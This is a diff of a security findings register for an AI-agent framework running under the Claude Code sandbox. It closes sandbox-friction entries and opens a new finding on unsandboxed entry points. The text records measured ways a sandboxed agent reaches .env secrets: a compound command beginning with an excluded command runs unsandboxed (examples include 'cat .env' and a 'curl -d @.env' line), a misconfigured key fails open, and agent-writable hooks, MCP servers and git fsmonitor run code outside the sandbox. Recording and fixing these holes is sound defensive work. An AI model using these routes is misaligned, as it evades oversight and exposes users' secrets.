@@ -1597,7 +1597,7 @@ names `.npmrc` as the location) is absent. Observed: `agents.md:159` (`RA-10`) s
 does not read them from `.npmrc`"; the only `npmrc` mentions left in `agents.md`,
 `README.md`, `rules/` and `workflows/` are those negations. `make verify` exit `0`.
 
-### - [ ] `F-115-N2` — consolidated sandbox friction, eight failures `S-1`..`S-8` (absorbs `F-114-N6`)
+### - [x] `F-115-N2` — consolidated sandbox friction, eight failures `S-1`..`S-8` (absorbs `F-114-N6`)
 
 **Host-reported, not re-measured in the nucleus sandbox.** The evidence below is
 the host's, quoted as observed there. Reproducing each row inside the nucleus's own
@@ -1632,6 +1632,41 @@ be measured in the real sandbox first.
 
 **Routed:** Sprint 055 (block D, routed by Sprint 054 unit `W02`). Not taken by
 Sprint 054.
+
+**Closed — Sprint 055.** The reproduction the entry required ran first: Sprint 055
+unit `U01` measured the template sandbox against `S-1`..`S-7` and recorded the result
+in `docs/sprints/055-core-pipeline/SANDBOX_MEASUREMENT.md` (`27210b1`). It ran in
+headless `claude -p --settings <overlay>` sessions on Claude Code CLI 2.1.119 (macOS),
+not in the human-launched interactive session plan `D1` named, because an agent's Bash
+tool has no TTY (deviation recorded in `SPRINT_LOG.md`; `SANDBOX_MEASUREMENT.md` §1.1).
+Each run was valid only with control `SBX0` = 0 and `SBX1` = 6. Case ids in the
+verdict column are those of `SANDBOX_MEASUREMENT.md` §2.
+
+| ID | Measured verdict | Resolution | SHA(s) |
+| :--- | :--- | :--- | :--- |
+| `S-1` | Reproduced (`S-1`: `PermissionError`, exit 1 on `.claude/settings.local.json`) | `scripts/install.py` probes the write and, on a denied path, prints the host-form human command and exits `3` with no traceback (`U05`); `scripts/session_start.py` reports the bridge advisory by mode (`U06`) | `f4986b5`, `6773f34` |
+| `S-2` | Reproduced for `.env.example` (`S-2a`); `git status` noise (`S-2b`) inconclusive | Template keeps `./.env.*` in `denyRead` and adds `allowRead` for `.env.example`, `.env.sample`, `.env.template` (`U07`); `U04` (merge prune) omitted as unnecessary after that measured `allowRead` | `3ad277f` |
+| `S-3` | Reproduced (`S-3a` `.env` open, `S-3b` the `RA-09` mechanism `. ./.env`) | Option (b) of the host proposal, final state: `scripts/with_env.py`, an allowlist-gated wrapper (`U02`) with `config/with_env_allowlist.json` holding the three names `graphify-extract`, `graphify-extract-deep` and `graphify-label` (`U03`), run by the human (`make graphify-deep`); there is no sanctioned agent secret path under the sandbox. No `excludedCommands` entry is shipped or rendered (QA Gate 1 round 3 `N1`: the earlier design of absolute lines rendered into `.claude/settings.local.json`, `U07`, is retired). `RA-09` rewritten (`U13`) and `devops_agent` pointed at the wrapper (`U20`) | `6a090a4`, `25dda50`, `3ad277f`, `e589f19`, `056a5e3`, `e68ac72`, `cfe7950`, `b5b3088`, `55911a1`, `fb23f31`, `3fd788e`, `7580443` |
+| `S-4` | Reproduced for `stat` (`S-4a`) and pytest (`S-4c`, signature `found no collectors`, not the host `PermissionError`); `graphify update .` (`S-4b`) not reproduced in the nucleus | Documented form in the sandbox table (`U09`) and `rules/graphify.md` (`U11`: key path, 7 variables); `Makefile` `graphify-update` uses `-m graphify` and `graphify-deep` runs through the wrapper (`U08`) | `c716b7f`, `f53b7fe`, `ddd5bc7` |
+| `S-5` | `git` (`S-5a`, `S-5b`) and `curl` (`S-5d`) refuted; Go-based `gh` reproduced (`S-5c`, `x509: OSStatus -26276`) | Final state: every `gh` call is human-run (residual risk: the "After a sandboxed agent session" row of `rules/project_topology.md` section 4); no `gh` pattern is excluded (the five inspection patterns of `U07` were retired by `N1` and are pruned from hosts by `RETIRED_VALUES`); sandbox table (`U09`); `workflows/deployment_workflow.md` (`U15`) and `workflows/repository_hardening_workflow.md` (`U16`) point their `gh` steps at the table | `3ad277f`, `c716b7f`, `664c931`, `30d0a50`, `fb23f31`, `7580443` |
+| `S-6` | Inconclusive: the pnpm store relocates into the working tree (`S-6a`) and the relocated directory does not exist (`S-6b`); the host `ERR_PNPM_STORE_DIR_OPEN_OPERATION_LOCK` was not reproduced (no pnpm project in the nucleus) | Documented in the sandbox table (`U09`); no template change | `c716b7f` |
+| `S-7` | Reproduced (`S-7a` Mach port denied, exit -5; `S-7b` process died) | Plan `D6` Branch B: browser verification is human-run (`rules/qa_and_testing.md`, `U10`); `allowMachLookup` is prohibited and the prohibition is recorded in the sandbox table (`U09`) | `d6b2649`, `c716b7f` |
+| `S-8` | Not a measured case (documentation row) | The sandbox table in `rules/project_topology.md` covering `S-1`..`S-7` (`U09`) | `c716b7f` |
+
+`F-114-N6` closes with this entry. `S-6` stays closed as documented, not as fixed: a
+host that reproduces `ERR_PNPM_STORE_DIR_OPEN_OPERATION_LOCK` should reopen it with
+the measured store path.
+
+**Four new framework-class observations, noted in closure.** All come from
+`SANDBOX_MEASUREMENT.md` and are not part of `S-1`..`S-8`. The first two are not
+fixed by this sprint; `N1` is closed for the template, the render and the published values; `N3` is only reduced by the `D13` denies, with residual vectors open in `F-055-N1`.
+
+| Observation | Measured fact | Where recorded |
+| :--- | :--- | :--- |
+| `allowMachLookup: true` fails open | On CLI 2.1.119 the boolean key stopped the sandbox from starting (`SBX0` exit 1, `SBX1` HTTP 200); `.env` was readable and `docker info` succeeded, with `allowUnsandboxedCommands: false` and no warning. An unknown key did not do this; the list form kept the sandbox active but did not let Chromium launch | `SANDBOX_MEASUREMENT.md` §4; prohibition in the sandbox table (`c716b7f`) |
+| `./` sandbox paths resolve against the declaring settings file | With `--settings <file elsewhere>`, `./.env` did not protect the repository `.env` (opened with exit 0). The template protects only when merged into project settings | `SANDBOX_MEASUREMENT.md` §1.3 |
+| `N1`: one `excludedCommands` match unsandboxes a compound command | On CLI 2.1.119 a compound command whose first part matches ANY `excludedCommands` entry runs wholly outside the sandbox (`<excluded> && cat .env`, `gh auth status; curl -d @.env ...` read the secret), including an entry a host added itself (`A3`). The framework ships none and a host MUST NOT add one. Fixed by `fb23f31`, `3fd788e`, `7580443` | `SANDBOX_MEASUREMENT.md` §9; sandbox table in `rules/project_topology.md` |
+| `N3`: hooks run unsandboxed | Hooks run outside the sandbox by Claude Code's design: an agent-edited `.agents/hooks/on_commit.py` read `.env`. The template write-denies `./.agents/{hooks,scripts,config,skills,claude,venv_skillopt}` (`D13`); this reduces exposure and does not close the risk: QA Gate 1 round 4 measured further unsandboxed entry points that still read `.env`, recorded as open in `F-055-N1` below | `SANDBOX_MEASUREMENT.md` §9 `B1`-`B5`, `C1`; sandbox table in `rules/project_topology.md` |
 
 ### - [x] `F-115-N3` — the start command names a path that does not exist at a host root (`F-114-N4` is the same defect)
 
@@ -1947,6 +1982,42 @@ shows the mode test. The host's own latest session boot wrote the host anchor
 
 **Closed on that basis**, not on the sprint record that claimed the fix. Filed as
 ticked so the id is no longer unknown to this register. No Sprint 054 unit.
+
+---
+
+## Found by Sprint 055 QA Gate 1 round 4 — unsandboxed entry points (measured on a host fixture)
+
+### - [ ] `F-055-N1` — unsandboxed execution entry points remain agent-writable, so the write-deny set of `F-115-N2` `N3` reduces exposure and is not a boundary
+
+**Defect.** Claude Code runs hooks, MCP servers, subagent `hooks:` and some helper
+processes outside the sandbox. The template write-denies six `.agents` trees
+(`fb23f31`), yet the vectors below are still writable by the sandboxed agent and each
+one marked *measured* read `.env` outside the sandbox on a host fixture (host
+identifiers omitted, `RA-15`). `agents.md` `RA-19` (`f8dc545`) forbids any document
+from claiming otherwise until the enumeration below is complete.
+
+| ID | Vector | Evidence | Status |
+| :--- | :--- | :--- | :--- |
+| `Q1` | Hooks put the writable `.agents` root on `sys.path` and import `_mode`; an agent-written `.agents/_mode.py` runs unsandboxed on every Bash call | `hooks/on_commit.py:30-32`; same pattern in `hooks/on_init.py`, `hooks/on_commit_msg.py`, `scripts/persist_session_context.py` | measured |
+| `Q2` | `scripts/submodule_purity.py`, run by `on_commit.py`, calls `git -C .agents status`, which honours a `core.fsmonitor` the agent can set in `.git/modules/.agents/config`. The same holds for any unsandboxed `git` at the host root, including the human's own: it runs the submodule's `core.fsmonitor` (measured QA Gate 1 round 6, git 2.54.0) | `scripts/submodule_purity.py`, `hooks/on_commit.py` | measured |
+| `Q3` | MCP servers of `claude/mcp.json` start unsandboxed from writable `.agents/mcp_servers/` and a host-root `graphify/` package (`-m graphify.serve` without `-I`); the launcher of the GitHub MCP is agent-writable | `claude/mcp.json` | measured |
+| `Q4` | Subagent definitions in writable `.agents/agents/` (symlinked into `.claude/agents/`) can carry `hooks:` that run unsandboxed | `agents/*.md` | measured |
+| `Q5` | The human route `make -f .agents/Makefile graphify-deep` runs a recipe the agent can edit | `Makefile` `graphify-deep` | derived, not run |
+| `Q7` | Hooks run bare `python3` from `PATH`; an active host venv makes the interpreter and its `.pth` files agent-writable | `hooks/*.py` command lines in `claude/settings.hooks.json` | record, pre-existing |
+| `Q11` | `.agents/agents.md`, `rules/`, `workflows/` are writable: instruction tampering, not execution | `agents.md`, `rules/`, `workflows/` | record, pre-existing |
+
+**Required deliverable.** The `RA-19` enumeration: a measured list of every
+unsandboxed entry point (hooks, MCP servers, subagent `hooks:`, `make` recipes, helper
+processes) with, per entry, whether the agent can write what it executes. Until it
+exists, no document states that a secret or the host is out of the agent's reach;
+current wording is in the `N3` row of `rules/project_topology.md` section 4.
+
+**Reproduce.** Each measured row: write the named file in a scratch host fixture,
+trigger the named invoker, observe a read of `.env` from outside the sandbox. `Q5`:
+`git diff -- Makefile` after an agent edit shows the recipe change a human would run.
+
+**Routed:** Sprint 056. Not taken by Sprint 055 (scope cut after Gate 1 round 4;
+doc wording reworded in Sprint 055 units `U37`, `U38`, `U40`).
 
 ---
 
